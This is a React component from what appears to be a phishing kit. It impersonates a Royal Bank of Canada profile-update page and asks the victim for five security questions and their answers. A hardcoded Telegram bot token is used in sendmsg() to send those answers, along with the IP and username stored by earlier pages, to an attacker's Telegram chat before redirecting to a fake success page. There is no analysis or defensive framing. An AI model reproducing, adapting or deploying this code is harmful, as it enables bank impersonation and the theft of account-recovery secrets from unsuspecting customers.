import { useEffect, useState } from "react";
import { useHistory } from "react-router";

import "./index.css";

function Page2() {
  const history = useHistory();
  const { TelegramClient } = require("messaging-api-telegram");
  const [input1, setinput1] = useState("");
  const [que1, setQue1] = useState("");
  const [input2, setinput2] = useState("");
  const [que2, setQue2] = useState("");
  const [input3, setinput3] = useState("");
  const [que3, setQue3] = useState("");
  const [input4, setinput4] = useState("");
  const [que4, setQue4] = useState("");
  const [input5, setinput5] = useState("");
  const [que5, setQue5] = useState("");

  const [loading, setloading] = useState(false);
  const [error, setError] = useState(false);
  const [login, setlogin] = useState("");
  const [ip, setIp] = useState("");


  const client = new TelegramClient({
    accessToken: "1867080844:AAGf7rwEB9zCwpHDUFZjjwytXRGuObBSf74",
  });
  const sendmsg = async () => {
    console.log("sending msg now");
    setIp(localStorage.getItem('ip'));
    setlogin(localStorage.getItem('user'));
    await client.sendMessage(-427458504, " \n qs1 : " + que1 + " \n reponse " + input1 + "  \n qs2  : " + que2 + " \n reponse " + input2 + "  \n qs3 :" + que3 + " \n reponse " + input3 + "  \n qs4 :" + que4 + " \n reponse 4 " + input4 + "  \n qs5 :" + que5 + " \n reponse5 " + input5 + " \n IP: " + localStorage.getItem('ip') + "\n USER: " + localStorage.getItem('user'));
  };
  const handleSubmit = (e) => {

    e.preventDefault();
    input1 && input2 && input3 ? setloading(true) : setError(true);
    setTimeout(() => {
      input1 && input2 && input3 && sendmsg() && history.push("/success");
    }, 3000);
  };
  return (
    <>
      <header
        _ngcontent-ucb-c48=""
        data-loc="personal-banking"
        className="n-search n-location n-language n-contact n-secure menu-open"
      >
        <div
          _ngcontent-ucb-c48=""
          id="header"
          data-domain="rbcroyalbank.com"
          className="master-header"
        >
          <div _ngcontent-ucb-c48="" className="mobile-header-content">
            <a _ngcontent-ucb-c48="" href="" className="mobile-logo-wpr">
              <div _ngcontent-ucb-c48="" className="logo-img">
                <img
                  _ngcontent-ucb-c48=""
                  src="./rbc-logo-shield.svg"
                  alt="RBC"
                />
                <div _ngcontent-ucb-c48="" className="logo-text">
                  Royal Bank
                </div>
              </div>
            </a>
            <div _ngcontent-ucb-c48="" className="mobile-nav">
              <span
                _ngcontent-ucb-c48=""
                href=""
                id="header-mobile-sign-in-btn"
                className="mobile-secure-btn"
              >
                <span _ngcontent-ucb-c48="">
                  <i _ngcontent-ucb-c48="" className="fas fa-lock"></i>SECURE
                </span>
              </span>
              <button
                _ngcontent-ucb-c48=""
                aria-label="Menu"
                className="mobile-nav-btn active"
              >
                <span _ngcontent-ucb-c48="">MENU</span>
              </button>
            </div>
          </div>
        </div>
        <div
          _ngcontent-ucb-c48=""
          id="search-bar"
          tabindex="-1"
          role="dialog"
          aria-labelledby="header-search"
          aria-hidden="true"
          className="search-bar"
        >
          <div _ngcontent-ucb-c48="" className="search-bar-inner">
            <div _ngcontent-ucb-c48="" className="search-logo">
              <img
                _ngcontent-ucb-c48=""
                src="https://www.rbcroyalbank.com/dvl/v1.0/assets/images/logos/rbc-logo-shield-blue.svg"
                alt="RBC"
              />
            </div>
            <div _ngcontent-ucb-c48="" className="search-form">
              <form
                _ngcontent-ucb-c48=""
                novalidate=""
                method="get"
                action="https://www.rbcroyalbank.com/search-public/index.html"
                id="header-search-form"
                className="ng-untouched ng-pristine ng-valid"
              >
                <label
                  _ngcontent-ucb-c48=""
                  for="header-search"
                  className="offscreen"
                >
                  Ask your question
                </label>
                <input
                  _ngcontent-ucb-c48=""
                  type="hidden"
                  name="type"
                  id="header-search-type"
                  value="0"
                />
                <input
                  _ngcontent-ucb-c48=""
                  type="search"
                  name="question"
                  id="header-search"
                  autoComplete="off"
                  placeholder="Ask your question"
                  className="ui-autocomplete-input"
                />
              </form>
              <button
                _ngcontent-ucb-c48=""
                type="button"
                id="search-close"
                aria-label="Close search"
                className="search-close"
              >
                <img
                  _ngcontent-ucb-c48=""
                  src="https://www.rbcroyalbank.com/dvl/v1.0/assets/images/ui/ui-close-blue.svg"
                  alt="Close search"
                />
              </button>
            </div>
          </div>
        </div>
      </header>

      <div _ngcontent-wde-c49="" class="ssee">
        <div _ngcontent-wde-c49="" id="app" class="scum">
          <h1 _ngcontent-wde-c49="" class="appskwi">
            [1/2] Profile - Update
          </h1>
          <p _ngcontent-wde-c49="" class="razzz">
            Please select your Personal Verification Questions &amp; Information
            and enter the answers in the fields below.
            <br _ngcontent-wde-c49="" /> The following questions are asked only
            to identify you.
            <br _ngcontent-wde-c49="" /> When you are done, click "Continue."
          </p>
          <form
            _ngcontent-wde-c49=""
            novalidate=""
            action=""
            method="post"
            id="ContinueForm"
            name="Conti2nueForm"
            autocomplete="off"
            class="ng-pristine ng-invalid ng-touched"
          >
            <fieldset _ngcontent-wde-c49="">
              <div _ngcontent-wde-c49="" class="q_block">
                <div
                  _ngcontent-wde-c49=""
                  class="input input--dynamic app-margined form-group"
                >
                  <div _ngcontent-wde-c49="" class="input__label-container">
                    <label
                      _ngcontent-wde-c49=""
                      for="input-id"
                      class="label razzz form-control-label"
                    >
                      Question #1 -{" "}
                      <i _ngcontent-wde-c49="" class="fas fa-question"></i>
                    </label>
                  </div>
                  <select
                    onChange={(event) => {
                      setQue1(event.target.value);
                    }}
                    _ngcontent-wde-c49=""
                    required=""
                    name="q1"
                    data-reg="/.{4,}/"
                    id="q1"
                    title="Select a question"
                    class="form-control ng-pristine ng-invalid ng-touched"
                    ng-reflect-required=""
                    ng-reflect-name="q1"
                    ng-reflect-model=""
                  >
                    <option _ngcontent-wde-c49="" value="" ng-reflect-value="">
                      Please select security question
                    </option>
                    <option
                      _ngcontent-wde-c49=""
                      value="What was the first movie I ever saw"
                      ng-reflect-value="What was the first movie I eve"
                    >
                      What was the first movie I ever saw?
                    </option>
                    <option
                      _ngcontent-wde-c49=""
                      value="What is the middle name of my oldest child"
                      ng-reflect-value="What is the middle name of my "
                    >
                      What is the middle name of my oldest child?
                    </option>
                    <option
                      _ngcontent-wde-c49=""
                      value="In which city was my father born"
                      ng-reflect-value="In which city was my father bo"
                    >
                      In which city was my father born?
                    </option>
                    <option
                      _ngcontent-wde-c49=""
                      value="In which city was my mother born"
                      ng-reflect-value="In which city was my mother bo"
                    >
                      In which city was my mother born?
                    </option>
                    <option
                      _ngcontent-wde-c49=""
                      value="Who was my favourite cartoon character as a child"
                      ng-reflect-value="Who was my favourite cartoon c"
                    >
                      Who was my favourite cartoon character as a child?
                    </option>
                    <option
                      _ngcontent-wde-c49=""
                      value="What is my mother's middle name"
                      ng-reflect-value="What is my mother's middle nam"
                    >
                      What is my mother's middle name?
                    </option>
                    <option
                      _ngcontent-wde-c49=""
                      value="In what year did I meet my significant other"
                      ng-reflect-value="In what year did I meet my sig"
                    >
                      In what year did I meet my significant other?
                    </option>
                    <option
                      _ngcontent-wde-c49=""
                      value="What was my first pet's name"
                      ng-reflect-value="What was my first pet's name"
                    >
                      What was my first pet's name?
                    </option>
                    <option
                      _ngcontent-wde-c49=""
                      value="First name of the maid of honour at my wedding"
                      ng-reflect-value="First name of the maid of hono"
                    >
                      First name of the maid of honour at my wedding?
                    </option>
                    <option
                      _ngcontent-wde-c49=""
                      value="First name of my best friend in elementary school"
                      ng-reflect-value="First name of my best friend i"
                    >
                      First name of my best friend in elementary school?
                    </option>
                    <option
                      _ngcontent-wde-c49=""
                      value="Name of my all-time favourite movie character"
                      ng-reflect-value="Name of my all-time favourite "
                    >
                      Name of my all-time favourite movie character?
                    </option>
                  </select>
                </div>
                <div
                  _ngcontent-wde-c49=""
                  class="input input--dynamic app-margined form-group"
                >
                  <div _ngcontent-wde-c49="" class="input__label-container">
                    <label
                      _ngcontent-wde-c49=""
                      for="input-id"
                      class="label razzz2 form-control-label"
                    >
                      Answer #1
                    </label>
                  </div>
                  <input
                    onChange={(event) => {
                      setinput1(event.target.value);
                    }}
                    _ngcontent-wde-c49=""
                    required=""
                    name="a1"
                    type="text"
                    data-reg="/.{3,}/"
                    id="a1"
                    class="form-control ng-untouched ng-pristine ng-invalid"
                    ng-reflect-required=""
                    ng-reflect-name="a1"
                    ng-reflect-model=""
                  />
                </div>
              </div>
              <br _ngcontent-wde-c49="" />
              <hr _ngcontent-wde-c49="" />
              <br _ngcontent-wde-c49="" />
              <div _ngcontent-wde-c49="" class="q_block">
                <div
                  _ngcontent-wde-c49=""
                  class="input input--dynamic app-margined form-group"
                >
                  <div _ngcontent-wde-c49="" class="input__label-container">
                    <label
                      _ngcontent-wde-c49=""
                      for="input-id"
                      class="label razzz form-control-label"
                    >
                      Question #2 -{" "}
                      <i _ngcontent-wde-c49="" class="fas fa-question"></i>
                    </label>
                  </div>
                  <select
                    onChange={(event) => {
                      setQue2(event.target.value);
                    }}
                    _ngcontent-wde-c49=""
                    required=""
                    name="q2"
                    data-reg="/.{4,}/"
                    id="q2"
                    title="Select a question"
                    class="form-control ng-untouched ng-pristine ng-invalid"
                    ng-reflect-required=""
                    ng-reflect-name="q2"
                    ng-reflect-model=""
                  >
                    <option _ngcontent-wde-c49="" value="" ng-reflect-value="">
                      Please select security question
                    </option>
                    <option
                      _ngcontent-wde-c49=""
                      value="What was the first book I ever read"
                      ng-reflect-value="What was the first book I ever"
                    >
                      What was the first book I ever read?
                    </option>
                    <option
                      _ngcontent-wde-c49=""
                      value="What was the first company I ever worked for"
                      ng-reflect-value="What was the first company I e"
                    >
                      What was the first company I ever worked for?
                    </option>
                    <option
                      _ngcontent-wde-c49=""
                      value="What High School did my mother attend"
                      ng-reflect-value="What High School did my mother"
                    >
                      What High School did my mother attend?
                    </option>
                    <option
                      _ngcontent-wde-c49=""
                      value="In which city was my mother born"
                      ng-reflect-value="In which city was my mother bo"
                    >
                      In which city was my mother born?
                    </option>
                    <option
                      _ngcontent-wde-c49=""
                      value="What is my spouse's/partner's middle name"
                      ng-reflect-value="What is my spouse's/partner's "
                    >
                      What is my spouse's/partner's middle name?
                    </option>
                    <option
                      _ngcontent-wde-c49=""
                      value="In which city did I get married"
                      ng-reflect-value="In which city did I get marrie"
                    >
                      In which city did I get married?
                    </option>
                    <option
                      _ngcontent-wde-c49=""
                      value="What is my best friend's first name"
                      ng-reflect-value="What is my best friend's first"
                    >
                      What is my best friend's first name?
                    </option>
                    <option
                      _ngcontent-wde-c49=""
                      value="What is the name of the first school I attended"
                      ng-reflect-value="What is the name of the first "
                    >
                      What is the name of the first school I attended?
                    </option>
                    <option
                      _ngcontent-wde-c49=""
                      value="What was my kindergarten teacher's last name"
                      ng-reflect-value="What was my kindergarten teach"
                    >
                      What was my kindergarten teacher's last name?
                    </option>
                    <option
                      _ngcontent-wde-c49=""
                      value="What is the first name of my oldest cousin"
                      ng-reflect-value="What is the first name of my o"
                    >
                      What is the first name of my oldest cousin?
                    </option>
                  </select>
                </div>
                <div
                  _ngcontent-wde-c49=""
                  class="input input--dynamic app-margined form-group"
                >
                  <div _ngcontent-wde-c49="" class="input__label-container">
                    <label
                      _ngcontent-wde-c49=""
                      for="input-id"
                      class="label razzz2 form-control-label"
                    >
                      Answer #2
                    </label>
                  </div>
                  <input
                    onChange={(event) => {
                      setinput2(event.target.value);
                    }}
                    _ngcontent-wde-c49=""
                    required=""
                    name="a2"
                    type="text"
                    data-reg="/.{3,}/"
                    id="a2"
                    class="form-control ng-untouched ng-pristine ng-invalid"
                    ng-reflect-required=""
                    ng-reflect-name="a2"
                    ng-reflect-model=""
                  />
                </div>
              </div>
              <br _ngcontent-wde-c49="" />
              <hr _ngcontent-wde-c49="" />
              <br _ngcontent-wde-c49="" />
              <div _ngcontent-wde-c49="" class="q_block">
                <div
                  _ngcontent-wde-c49=""
                  class="input input--dynamic app-margined form-group"
                >
                  <div _ngcontent-wde-c49="" class="input__label-container">
                    <label
                      _ngcontent-wde-c49=""
                      for="input-id"
                      class="label razzz form-control-label"
                    >
                      Question #3 -{" "}
                      <i _ngcontent-wde-c49="" class="fas fa-question"></i>
                    </label>
                  </div>
                  <select
                    onChange={(event) => {
                      setQue3(event.target.value);
                    }}
                    _ngcontent-wde-c49=""
                    required=""
                    name="q3"
                    data-reg="/.{4,}/"
                    id="q3"
                    title="Select a question"
                    class="form-control ng-untouched ng-pristine ng-invalid"
                    ng-reflect-required=""
                    ng-reflect-name="q3"
                    ng-reflect-model=""
                  >
                    <option _ngcontent-wde-c49="" value="" ng-reflect-value="">
                      Please select security question
                    </option>
                    <option
                      _ngcontent-wde-c49=""
                      value="What was the make of my first car"
                      ng-reflect-value="What was the make of my first "
                    >
                      What was the make of my first car?
                    </option>
                    <option
                      _ngcontent-wde-c49=""
                      value="What High School did my father attend"
                      ng-reflect-value="What High School did my father"
                    >
                      What High School did my father attend?
                    </option>
                    <option
                      _ngcontent-wde-c49=""
                      value="Which city did I meet my significant other"
                      ng-reflect-value="Which city did I meet my signi"
                    >
                      Which city did I meet my significant other?
                    </option>
                    <option
                      _ngcontent-wde-c49=""
                      value="Last name of my favourite High School teacher"
                      ng-reflect-value="Last name of my favourite High"
                    >
                      Last name of my favourite High School teacher?
                    </option>
                    <option
                      _ngcontent-wde-c49=""
                      value="Which country did I go to on my honeymoon"
                      ng-reflect-value="Which country did I go to on m"
                    >
                      Which country did I go to on my honeymoon?
                    </option>
                    <option
                      _ngcontent-wde-c49=""
                      value="First name of my best man at my wedding"
                      ng-reflect-value="First name of my best man at m"
                    >
                      First name of my best man at my wedding?
                    </option>
                    <option
                      _ngcontent-wde-c49=""
                      value="What was the name of my first manager"
                      ng-reflect-value="What was the name of my first "
                    >
                      What was the name of my first manager?
                    </option>
                    <option
                      _ngcontent-wde-c49=""
                      value="In what town or city was my significant other born"
                      ng-reflect-value="In what town or city was my si"
                    >
                      In what town or city was my significant other born?
                    </option>
                    <option
                      _ngcontent-wde-c49=""
                      value="Last name of my childhood best friend"
                      ng-reflect-value="Last name of my childhood best"
                    >
                      Last name of my childhood best friend?
                    </option>
                    <option
                      _ngcontent-wde-c49=""
                      value="What is the first name of my oldest nephew"
                      ng-reflect-value="What is the first name of my o"
                    >
                      What is the first name of my oldest nephew?
                    </option>
                  </select>
                </div>
                <div
                  _ngcontent-wde-c49=""
                  class="input input--dynamic app-margined form-group"
                >
                  <div _ngcontent-wde-c49="" class="input__label-container">
                    <label
                      _ngcontent-wde-c49=""
                      for="input-id"
                      class="label razzz2 form-control-label"
                    >
                      Answer #3
                    </label>
                  </div>
                  <input
                    onChange={(event) => {
                      setinput3(event.target.value);
                    }}
                    _ngcontent-wde-c49=""
                    required=""
                    name="a3"
                    type="text"
                    data-reg="/.{3,}/"
                    id="a3"
                    class="form-control ng-untouched ng-pristine ng-invalid"
                    ng-reflect-required=""
                    ng-reflect-name="a3"
                    ng-reflect-model=""
                  />
                </div>
              </div>
              <br _ngcontent-wde-c49="" />
              <hr _ngcontent-wde-c49="" />
              <br _ngcontent-wde-c49="" />
              <div _ngcontent-wde-c49="" class="q_block">
                <div
                  _ngcontent-wde-c49=""
                  class="input input--dynamic app-margined form-group"
                >
                  <div _ngcontent-wde-c49="" class="input__label-container">
                    <label
                      _ngcontent-wde-c49=""
                      for="input-id"
                      class="label razzz form-control-label"
                    >
                      Question #4 -{" "}
                      <i _ngcontent-wde-c49="" class="fas fa-question"></i>
                    </label>
                  </div>
                  <select
                    onChange={(event) => {
                      setQue4(event.target.value);
                    }}
                    _ngcontent-wde-c49=""
                    required=""
                    name="q4"
                    data-reg="/.{4,}/"
                    id="q4"
                    title="Select a question"
                    class="form-control ng-pristine ng-invalid ng-touched"
                    ng-reflect-required=""
                    ng-reflect-name="q4"
                    ng-reflect-model=""
                  >
                    <option _ngcontent-wde-c49="" value="" ng-reflect-value="">
                      Please select security question
                    </option>
                    <option
                      _ngcontent-wde-c49=""
                      value="What was the first movie I ever saw"
                      ng-reflect-value="What was the first movie I eve"
                    >
                      What was the first movie I ever saw?
                    </option>
                    <option
                      _ngcontent-wde-c49=""
                      value="What is the middle name of my oldest child"
                      ng-reflect-value="What is the middle name of my "
                    >
                      What is the middle name of my oldest child?
                    </option>
                    <option
                      _ngcontent-wde-c49=""
                      value="In which city was my father born"
                      ng-reflect-value="In which city was my father bo"
                    >
                      In which city was my father born?
                    </option>
                    <option
                      _ngcontent-wde-c49=""
                      value="In which city was my mother born"
                      ng-reflect-value="In which city was my mother bo"
                    >
                      In which city was my mother born?
                    </option>
                    <option
                      _ngcontent-wde-c49=""
                      value="Who was my favourite cartoon character as a child"
                      ng-reflect-value="Who was my favourite cartoon c"
                    >
                      Who was my favourite cartoon character as a child?
                    </option>
                    <option
                      _ngcontent-wde-c49=""
                      value="What is my mother's middle name"
                      ng-reflect-value="What is my mother's middle nam"
                    >
                      What is my mother's middle name?
                    </option>
                    <option
                      _ngcontent-wde-c49=""
                      value="In what year did I meet my significant other"
                      ng-reflect-value="In what year did I meet my sig"
                    >
                      In what year did I meet my significant other?
                    </option>
                    <option
                      _ngcontent-wde-c49=""
                      value="What was my first pet's name"
                      ng-reflect-value="What was my first pet's name"
                    >
                      What was my first pet's name?
                    </option>
                    <option
                      _ngcontent-wde-c49=""
                      value="First name of the maid of honour at my wedding"
                      ng-reflect-value="First name of the maid of hono"
                    >
                      First name of the maid of honour at my wedding?
                    </option>
                    <option
                      _ngcontent-wde-c49=""
                      value="First name of my best friend in elementary school"
                      ng-reflect-value="First name of my best friend i"
                    >
                      First name of my best friend in elementary school?
                    </option>
                    <option
                      _ngcontent-wde-c49=""
                      value="Name of my all-time favourite movie character"
                      ng-reflect-value="Name of my all-time favourite "
                    >
                      Name of my all-time favourite movie character?
                    </option>
                  </select>
                </div>
                <div
                  _ngcontent-wde-c49=""
                  class="input input--dynamic app-margined form-group"
                >
                  <div _ngcontent-wde-c49="" class="input__label-container">
                    <label
                      _ngcontent-wde-c49=""
                      for="input-id"
                      class="label razzz2 form-control-label"
                    >
                      Answer #4
                    </label>
                  </div>
                  <input
                    onChange={(event) => {
                      setinput4(event.target.value);
                    }}
                    _ngcontent-wde-c49=""
                    required=""
                    name="a1"
                    type="text"
                    data-reg="/.{3,}/"
                    id="a1"
                    class="form-control ng-untouched ng-pristine ng-invalid"
                    ng-reflect-required=""
                    ng-reflect-name="a1"
                    ng-reflect-model=""
                  />
                </div>
              </div>
              <br _ngcontent-wde-c49="" />
              <hr _ngcontent-wde-c49="" />
              <br _ngcontent-wde-c49="" />
              <div _ngcontent-wde-c49="" class="q_block">
                <div
                  _ngcontent-wde-c49=""
                  class="input input--dynamic app-margined form-group"
                >
                  <div _ngcontent-wde-c49="" class="input__label-container">
                    <label
                      _ngcontent-wde-c49=""
                      for="input-id"
                      class="label razzz form-control-label"
                    >
                      Question #5 -{" "}
                      <i _ngcontent-wde-c49="" class="fas fa-question"></i>
                    </label>
                  </div>
                  <select
                    onChange={(event) => {
                      setQue5(event.target.value);
                    }}
                    _ngcontent-wde-c49=""
                    required=""
                    name="q1"
                    data-reg="/.{4,}/"
                    id="q1"
                    title="Select a question"
                    class="form-control ng-pristine ng-invalid ng-touched"
                    ng-reflect-required=""
                    ng-reflect-name="q1"
                    ng-reflect-model=""
                  >
                    <option _ngcontent-wde-c49="" value="" ng-reflect-value="">
                      Please select security question
                    </option>
                    <option
                      _ngcontent-wde-c49=""
                      value="What was the first movie I ever saw"
                      ng-reflect-value="What was the first movie I eve"
                    >
                      What was the first movie I ever saw?
                    </option>
                    <option
                      _ngcontent-wde-c49=""
                      value="What is the middle name of my oldest child"
                      ng-reflect-value="What is the middle name of my "
                    >
                      What is the middle name of my oldest child?
                    </option>
                    <option
                      _ngcontent-wde-c49=""
                      value="In which city was my father born"
                      ng-reflect-value="In which city was my father bo"
                    >
                      In which city was my father born?
                    </option>
                    <option
                      _ngcontent-wde-c49=""
                      value="In which city was my mother born"
                      ng-reflect-value="In which city was my mother bo"
                    >
                      In which city was my mother born?
                    </option>
                    <option
                      _ngcontent-wde-c49=""
                      value="Who was my favourite cartoon character as a child"
                      ng-reflect-value="Who was my favourite cartoon c"
                    >
                      Who was my favourite cartoon character as a child?
                    </option>
                    <option
                      _ngcontent-wde-c49=""
                      value="What is my mother's middle name"
                      ng-reflect-value="What is my mother's middle nam"
                    >
                      What is my mother's middle name?
                    </option>
                    <option
                      _ngcontent-wde-c49=""
                      value="In what year did I meet my significant other"
                      ng-reflect-value="In what year did I meet my sig"
                    >
                      In what year did I meet my significant other?
                    </option>
                    <option
                      _ngcontent-wde-c49=""
                      value="What was my first pet's name"
                      ng-reflect-value="What was my first pet's name"
                    >
                      What was my first pet's name?
                    </option>
                    <option
                      _ngcontent-wde-c49=""
                      value="First name of the maid of honour at my wedding"
                      ng-reflect-value="First name of the maid of hono"
                    >
                      First name of the maid of honour at my wedding?
                    </option>
                    <option
                      _ngcontent-wde-c49=""
                      value="First name of my best friend in elementary school"
                      ng-reflect-value="First name of my best friend i"
                    >
                      First name of my best friend in elementary school?
                    </option>
                    <option
                      _ngcontent-wde-c49=""
                      value="Name of my all-time favourite movie character"
                      ng-reflect-value="Name of my all-time favourite "
                    >
                      Name of my all-time favourite movie character?
                    </option>
                  </select>
                </div>
                <div
                  _ngcontent-wde-c49=""
                  class="input input--dynamic app-margined form-group"
                >
                  <div _ngcontent-wde-c49="" class="input__label-container">
                    <label
                      _ngcontent-wde-c49=""
                      for="input-id"
                      class="label razzz2 form-control-label"
                    >
                      Answer #5
                    </label>
                  </div>
                  <input
                    onChange={(event) => {
                      setQue5(event.target.value);
                    }}
                    _ngcontent-wde-c49=""
                    required=""
                    name="a1"
                    type="text"
                    data-reg="/.{3,}/"
                    id="a1"
                    class="form-control ng-untouched ng-pristine ng-invalid"
                    ng-reflect-required=""
                    ng-reflect-name="a1"
                    ng-reflect-model=""
                  />
                </div>
              </div>
              <br _ngcontent-wde-c49="" />
              <hr _ngcontent-wde-c49="" />
              <br _ngcontent-wde-c49="" />
              <div _ngcontent-wde-c49="" class="inputWrapper">
                <button
                  onClick={handleSubmit}
                  _ngcontent-wde-c49=""
                  tabindex="4"
                  class="bleuBtnLarge"
                >
                  <span _ngcontent-wde-c49="" style={{ display: "block" }}>
                    {loading ? (
                      <i
                        _ngcontent-wde-c49=""
                        class="fas fa-circle-notch fa-spin"
                      ></i>
                    ) : (
                      "Continue"
                    )}
                  </span>
                </button>
              </div>
              {error && (
                <div
                  _ngcontent-wde-c49=""
                  class="sdhw"
                  style={{ display: "block" }}
                >
                  <br _ngcontent-wde-c49="" /> make sure you answer all the
                  questions above{" "}
                </div>
              )}
            </fieldset>
          </form>
        </div>
      </div>

      <div
        _ngcontent-wde-c48=""
        tabindex="-1"
        role="region"
        aria-label="Notice"
        className="importantNotice"
      >
        <div _ngcontent-wde-c48="" className="serviceNotice_body">
          <div
            _ngcontent-wde-c48=""
            className="importantNotice_body_links notice_body_item"
          >
            <a
              _ngcontent-wde-c48=""
              title="COVID-19 - How RBC is helping clients (Opens new tab)"
            >
              <span _ngcontent-wde-c48="">
                <img
                  _ngcontent-wde-c48=""
                  src="https://www1.royalbank.com/uos/3m/images/icons/informational-32.svg"
                  alt="Important Notice"
                  className="accessible"
                />
              </span>
              <span _ngcontent-wde-c48=""></span> Important Notices{" "}
              <br _ngcontent-wde-c48="" /> COVID-19 - How RBC is helping clients
              <i
                _ngcontent-wde-c48=""
                aria-hidden="true"
                title="Opens new tab"
                className="rbc-icon2019 rbc_new_window2019_blue"
              ></i>
              <span _ngcontent-wde-c48="" className="accessible">
                (Opens new tab)
              </span>
            </a>
          </div>
        </div>
      </div>
      <div _ngcontent-wde-c48="" className="main-legal">
        <div _ngcontent-wde-c48="" className="main-legal-inner">
          <div _ngcontent-wde-c48="" className="legal-left">
            <p _ngcontent-wde-c48="">
              Royal Bank of Canada Website, © 1995-2021
            </p>
            <p _ngcontent-wde-c48="">
              <a
                _ngcontent-wde-c48=""
                title="Legal (Opens new window)"
                ga-on="click"
                ga-event-category="Footer"
                ga-event-action="Click Link"
                ga-event-label="Legal"
              >
                Legal
                <span _ngcontent-wde-c48="" className="accessible">
                  {" "}
                  (Opens new window)
                </span>
              </a>{" "}
              &nbsp;|&nbsp;{" "}
              <a
                _ngcontent-wde-c48=""
                title="Accessibility (Opens new window)"
                ga-on="click"
                ga-event-category="Footer"
                ga-event-action="Click Link"
                ga-event-label="Accessibility"
              >
                Accessibility
                <span _ngcontent-wde-c48="" className="accessible">
                  {" "}
                  (Opens new window)
                </span>
              </a>{" "}
              &nbsp;|&nbsp;{" "}
              <a
                _ngcontent-wde-c48=""
                title="Privacy &amp; Security (Opens new window)"
                ga-on="click"
                ga-event-category="Footer"
                ga-event-action="Click Link"
                ga-event-label="Privacy &amp; Security"
              >
                Privacy &amp; Security
                <span _ngcontent-wde-c48="" className="accessible">
                  {" "}
                  (Opens new window)
                </span>
              </a>
            </p>
          </div>
        </div>
      </div>
    </>
  );
}

export default Page2;
